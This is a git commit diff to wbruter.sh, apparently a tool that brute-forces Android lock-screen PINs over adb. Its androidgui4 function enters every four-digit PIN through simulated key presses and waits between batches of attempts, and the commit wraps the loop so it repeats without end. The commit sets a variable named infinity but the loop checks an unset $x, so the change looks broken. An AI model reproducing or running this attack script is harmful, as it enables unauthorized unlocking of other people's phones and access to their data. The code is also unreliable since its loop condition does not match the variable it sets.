75bbcc0fc4617b324c46715df464adc103ac452f
JebemtiMaiku <niki.iff@hotmail.com>
2023-05-23 20:45:50 +0200

    infinity

--- wbruter.sh
+++ wbruter.sh
@@ -213,6 +213,7 @@ android6() {
 
 
 androidgui4() {
+        infinity=1
         screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
         case $screen in
             "mScreenState=OFF") echo -e "Preparing to attack."; 
@@ -223,26 +224,28 @@ androidgui4() {
         adb shell input keyevent 3
         adb shell input keyevent 82
         adb shell input swipe 407 1211 378 85
-        for i in {0000..9999}; do
-            if [[ $i != 0000 ]]; then
-                echo -e "\e[0;1mTrying pin:  $i\e[0m"
-                for (( j=0; j<${#i}; j++ )); do
-                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
-                done
-                adb shell input keyevent 66
-                adb shell input swipe 407 1211 378 85
-                clear() {
-                    adb shell input keyevent KEYCODE_MOVE_END
-                    adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
-                if ! (( `expr $i + 1` % 4 )); then
+        while [ $x == 1 ]; do
+            for i in {0000..9999}; do
+                if [[ $i != 0000 ]]; then
+                    echo -e "\e[0;1mTrying pin:  $i\e[0m"
+                    for (( j=0; j<${#i}; j++ )); do
+                        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+                    done
                     adb shell input keyevent 66
-                    sleep 15
-                    adb shell input keyevent 3
-                    sleep 15
-                    adb shell input keyevent 82
                     adb shell input swipe 407 1211 378 85
+                    clear() {
+                        adb shell input keyevent KEYCODE_MOVE_END
+                        adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+                    if ! (( `expr $i + 1` % 4 )); then
+                        adb shell input keyevent 66
+                        sleep 15
+                        adb shell input keyevent 3
+                        sleep 15
+                        adb shell input keyevent 82
+                        adb shell input swipe 407 1211 378 85
+                    fi
                 fi
-            fi
+            done
         done
     }
 
